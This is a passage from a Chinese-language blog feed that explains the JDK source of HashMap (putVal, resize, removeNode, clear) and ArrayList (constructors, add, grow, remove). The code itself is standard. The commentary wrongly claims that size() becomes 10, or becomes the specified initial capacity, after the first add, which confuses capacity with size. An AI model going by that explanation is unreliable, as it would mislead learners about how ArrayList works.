(binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++modCount;</span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>首先判断当前Node数组是否为空，是的话，调用resize方法初始化数组</li>
<li>通过Hash值，找到数据在数组中对应的索引值，如果当前索引值处数据位null，就新生成一个节点插入</li>
<li>定位到Hash冲突的节点</li>
<li>如果当前节点是树节点，加入到树中</li>
<li>如果当前节点是链表节点，在链表尾新增一个节点</li>
<li>如果新增节点之后，链表长度超过阈值，则转为红黑树</li>
<li>如果当前key已经在Map中了，那么就在29行开始处，更新已有的值</li>
<li>接着判断当前大小是否超过阈值，是的话，哈希表扩容</li>
</ol>
<h4 id="resize方法"><a href="#resize方法" class="headerlink" title="resize方法"></a>resize方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">        <span class="keyword">int</span> oldCap = (oldTab == <span class="keyword">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">        <span class="keyword">int</span> oldThr = threshold;</span><br><span class="line">        <span class="keyword">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 不是首次插入</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果当前容量已经超过最大容量，那么直接将阈值设置为Integer.MAX_VALUE</span></span><br><span class="line">            <span class="comment">// 不再扩容，直接返回原Node数组</span></span><br><span class="line">            <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">                threshold = Integer.MAX_VALUE;</span><br><span class="line">                <span class="keyword">return</span> oldTab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 否则，HashMap大小扩容两倍</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                     oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">                newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">            newCap = oldThr;</span><br><span class="line">        <span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">            <span class="comment">// 首次初始化</span></span><br><span class="line">            newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">            newThr = (<span class="keyword">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 计算新的容量和阈值</span></span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)newCap * loadFactor;</span><br><span class="line">            newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                      (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新阈值</span></span><br><span class="line">        threshold = newThr;</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            <span class="comment">// 生成一个2倍于原数组大小的Node数组</span></span><br><span class="line">            Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[newCap];</span><br><span class="line">        table = newTab;</span><br><span class="line">        <span class="comment">// 将原Node数组里的Node重新hash</span></span><br><span class="line">        <span class="keyword">if</span> (oldTab != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">                Node&lt;K,V&gt; e;</span><br><span class="line">                <span class="comment">// 如果当前索引有数值</span></span><br><span class="line">                <span class="keyword">if</span> ((e = oldTab[j]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    oldTab[j] = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">// 如果只有一个头结点，直接插入新数组</span></span><br><span class="line">                    <span class="keyword">if</span> (e.next == <span class="keyword">null</span>)</span><br><span class="line">                        newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                    <span class="comment">// 如果是树节点</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                        ((TreeNode&lt;K,V&gt;)e).split(<span class="keyword">this</span>, newTab, j, oldCap);</span><br><span class="line">                    <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                        <span class="comment">// 如果是链表</span></span><br><span class="line">                        Node&lt;K,V&gt; loHead = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; hiHead = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; next;</span><br><span class="line">                        <span class="keyword">do</span> &#123;</span><br><span class="line">                            next = e.next;</span><br><span class="line">                            <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (loTail == <span class="keyword">null</span>)</span><br><span class="line">                                    loHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = e;</span><br><span class="line">                                loTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (hiTail == <span class="keyword">null</span>)</span><br><span class="line">                                    hiHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = e;</span><br><span class="line">                                hiTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">while</span> ((e = next) != <span class="keyword">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (loTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            loTail.next = <span class="keyword">null</span>;</span><br><span class="line">                            newTab[j] = loHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            hiTail.next = <span class="keyword">null</span>;</span><br><span class="line">                            newTab[j + oldCap] = hiHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newTab;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="remove-Object"><a href="#remove-Object" class="headerlink" title="remove(Object)"></a>remove(Object)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt; e;</span><br><span class="line">        <span class="keyword">return</span> (e = removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)) == <span class="keyword">null</span> ?</span><br><span class="line">            <span class="keyword">null</span> : e.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用方法removeNode实现移除逻辑</p>
<h4 id="removeNode"><a href="#removeNode" class="headerlink" title="removeNode()"></a>removeNode()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> hash, Object key, Object value,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">boolean</span> matchValue, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, index;</span><br><span class="line">        <span class="comment">// 如果数组飞空</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (p = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Node&lt;K,V&gt; node = <span class="keyword">null</span>, e; K k; V v;</span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                <span class="comment">// 当前头结点</span></span><br><span class="line">                node = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((e = p.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="comment">// 如果是树节点</span></span><br><span class="line">                    node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 在链表中查找</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                            ((k = e.key) == key ||</span><br><span class="line">                             (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">                            node = e;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        p = e;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果找的了对应的Node结点</span></span><br><span class="line">            <span class="keyword">if</span> (node != <span class="keyword">null</span> &amp;&amp; (!matchValue || (v = node.value) == value ||</span><br><span class="line">                                 (value != <span class="keyword">null</span> &amp;&amp; value.equals(v)))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    <span class="comment">// 从树中删除</span></span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)node).removeTreeNode(<span class="keyword">this</span>, tab, movable);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (node == p)</span><br><span class="line">                    <span class="comment">// 从链表中删除</span></span><br><span class="line">                    tab[index] = node.next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    p.next = node.next;</span><br><span class="line">                ++modCount;</span><br><span class="line">                --size;</span><br><span class="line">                afterNodeRemoval(node);</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>首先，找到对应符合条件的Node</li>
<li>移除</li>
</ol>
<h3 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            size = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length; ++i)</span><br><span class="line">                tab[i] = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>将size置为0</li>
<li>遍历node数组，每个值都置为null</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>HashMap</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>ArrayList源码解析</title>
    <url>/2020/04/17/Java/Java%E5%9F%BA%E7%A1%80/2020-04-17-ArrayList%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ArrayList源码解析"><a href="#ArrayList源码解析" class="headerlink" title="ArrayList源码解析"></a>ArrayList源码解析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ArrayList是Java SDK中提供的动态数组。相比于普通的数组，它的容量能自动增长，继承于AbstractList抽象类，实现了List、RandomAccess、Cloneable和Serializable接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">RandomAccess</span>, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>实现了RandomAccess接口，意味着它提供了随机访问的功能，可以方便地通过ArrayList.get(index)获取指定位置上的元素。</p>
<p>实现了Cloneable接口，重写了clone函数。</p>
<p>实现了Serializable接口，意味着ArrayList可以被序列化。</p>
<h2 id="实现逻辑"><a href="#实现逻辑" class="headerlink" title="实现逻辑"></a>实现逻辑</h2><p>ArrayList内部是使用一个数组来实现的。每当添加元素的时候超过了数组的大小，就会自动扩容。这些逻辑下个章节一一讲清楚。</p>
<h2 id="主要属性"><a href="#主要属性" class="headerlink" title="主要属性"></a>主要属性</h2><ul>
<li>DEFAULT_CAPACITY： 数组的默认大小。初始为10</li>
<li>EMPTY_ELEMENTDATA：空数组对象</li>
<li>DEFAULTCAPACITY_EMPTY_ELEMENTDATA：默认构造函数创建的ArrayList，使用这个空对象数组</li>
<li>elementData：对象存放数组</li>
<li>size：ArrayList中的元素个数</li>
<li>modCount：ArrayList中元素被改变的次数，用于快速失败</li>
</ul>
<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><p>下面就看看ArrayList中常用的一些函数是怎么实现的。</p>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><h4 id="默认无参构造函数"><a href="#默认无参构造函数" class="headerlink" title="默认无参构造函数"></a>默认无参构造函数</h4><p>作用：生成一个默认的ArrayList</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ArrayList() &#123;</span><br><span class="line">        this.elementData &#x3D; DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用此方法创建出来的数组容量为10，大小为0.当第一次调用add方法时，数组的size才会变成10.</p>
<h4 id="有参构造函数（指定初始化容量大小）"><a href="#有参构造函数（指定初始化容量大小）" class="headerlink" title="有参构造函数（指定初始化容量大小）"></a>有参构造函数（指定初始化容量大小）</h4><p>作用：创建一个指定容量的ArrayList</p>
<p>调用此方法创建执行容量的ArrayList。需要注意的是，在new完成之后，调用size()方法，返回的还是0.只有在第一次add之后，size才会变为指定的初始化容量大小。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (initialCapacity == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal Capacity: "</span>+</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（集合类对象）"><a href="#有参构造函数（集合类对象）" class="headerlink" title="有参构造函数（集合类对象）"></a>有参构造函数（集合类对象）</h4><p>作用：根据其他集合类的对象，生成一个ArrayList</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        elementData = c.toArray();</span><br><span class="line">        <span class="keyword">if</span> ((size = elementData.length) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">            <span class="keyword">if</span> (elementData.getClass() != Object[]<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                <span class="title">elementData</span> </span>= Arrays.copyOf(elementData, size, Object[]<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// replace with empty array.</span></span><br><span class="line">            <span class="keyword">this</span>.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过集合类对象创建一个ArrayList</p>
<h3 id="boolean-add-E-e-方法"><a href="#boolean-add-E-e-方法" class="headerlink" title="boolean add(E e)方法"></a>boolean add(E e)方法</h3><p>作用：添加一个元素到ArrayList的最后。</p>
<p>实现：首先通过ensureCapacityInternal方法，确保数组有足够的空间容纳新的一个元素。然后赋值，返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">        elementData[size++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再看看ensureCapacityInternal方法</p>
<h4 id="ensureCapacityInternal-int-newCapacity-方法"><a href="#ensureCapacityInternal-int-newCapacity-方法" class="headerlink" title="ensureCapacityInternal(int newCapacity)方法"></a>ensureCapacityInternal(int newCapacity)方法</h4><p>ensureCapacityInternal方法又调用了ensureExplicitCapacity和calculateCapacity方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="calculateCapacity-Object-elementData-int-minCapacity-方法"><a href="#calculateCapacity-Object-elementData-int-minCapacity-方法" class="headerlink" title="calculateCapacity(Object[] elementData, int minCapacity)方法"></a>calculateCapacity(Object[] elementData, int minCapacity)方法</h4><p>这个方法计算对象数组的大小。如果对象数组是空数组，也就是第一次添加元素的时候，那么它返回数组的默认大小10，否则，返回minCapacity。</p>
<p>总的来说，就是，如果是第一次添加元素，返回10，否则，返回minCapacity。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculateCapacity</span><span class="params">(Object[] elementData, <span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">            <span class="keyword">return</span> Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minCapacity;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="ensureExplicitCapacity-int-minCapacity-方法"><a href="#ensureExplicitCapacity-int-minCapacity-方法" class="headerlink" title="ensureExplicitCapacity(int minCapacity)方法"></a>ensureExplicitCapacity(int minCapacity)方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">            grow(minCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果minCapacity大于当前数组长度，调用grow方法，对数组进行扩容。</p>
<h4 id="grow-int-minCapaticy-方法"><a href="#grow-int-minCapaticy-方法" class="headerlink" title="grow(int minCapaticy)方法"></a>grow(int minCapaticy)方法</h4><p>ArrayList默认的扩容策略是扩容一半。</p>
<p>int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);</p>
<p>如果扩容一半之后，还是不够，那就使用minCapacity。</p>
<p>如果新容量超过了最大的数组大小，MAX_ARRAY_SIZE（值为Integer.MAX_VALUE - 8).调用hugeCapacity方法，确保大小不会溢出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">        <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="hugeCapacity-int-minCapacity"><a href="#hugeCapacity-int-minCapacity" class="headerlink" title="hugeCapacity(int minCapacity)"></a>hugeCapacity(int minCapacity)</h4><p>数组最大大小只能到Integer.MAX_VALUE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">        <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">            Integer.MAX_VALUE :</span><br><span class="line">            MAX_ARRAY_SIZE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-int-index-Object-0-方法"><a href="#add-int-index-Object-0-方法" class="headerlink" title="add(int index, Object 0)方法"></a>add(int index, Object 0)方法</h3><p>作用：将元素添加到ArrayList的指定位置上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">        System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                         size - index);</span><br><span class="line">        elementData[index] = element;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先做范围检查，通过之后再确保容量足够数量的元素。而后将指定位置之后的元素统一后移，再将o值赋值给index上。</p>
<h3 id="remove-int-index-方法"><a href="#remove-int-index-方法" class="headerlink" title="remove(int index)方法"></a>remove(int index)方法</h3><p>作用：删除指定位置上的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        rangeCheck(index);</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        E oldValue = elementData(index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                             numMoved);</span><br><span class="line">        elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>范围校验</li>
<li>获取旧值保存</li>
<li>计算需要移动的元素个数</li>
<li>将index之后的所有元素前移一个单位</li>
<li>原size位置的元素值置为null</li>
<li>返回旧值</li>
</ol>
<h3 id="remove-Object-o-方法"><a href="#remove-Object-o-方法" class="headerlink" title="remove(Object o)方法"></a>remove(Object o)方法</h3><p>作用：删除某个元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">                <span class="keyword">if</span> (elementData[index] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    fastRemove(index);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[index])) &#123;</span><br><span class="line">                    fastRemove(index);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>如果待删除的为null，直接调用fastRemove方法，移动元素，返回</li>
<li>如果待删除的元素不为null，通过equals方法获得指定元素后，调用fastRemove方法，移动元素，返回</li>
</ol>
<h4 id="fastRemove-int-index-方法"><a href="#fastRemove-int-index-方法" class="headerlink" title="fastRemove(int index)方法"></a>fastRemove(int index)方法</h4><p>作用：计算需要前移的元素个数，将元素前移一个单位</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">            System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                             numMoved);</span><br><span class="line">        elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="size-方法"><a href="#size-方法" class="headerlink" title="size()方法"></a>size()方法</h3><p>作用：返回当前ArrayList的大小</p>
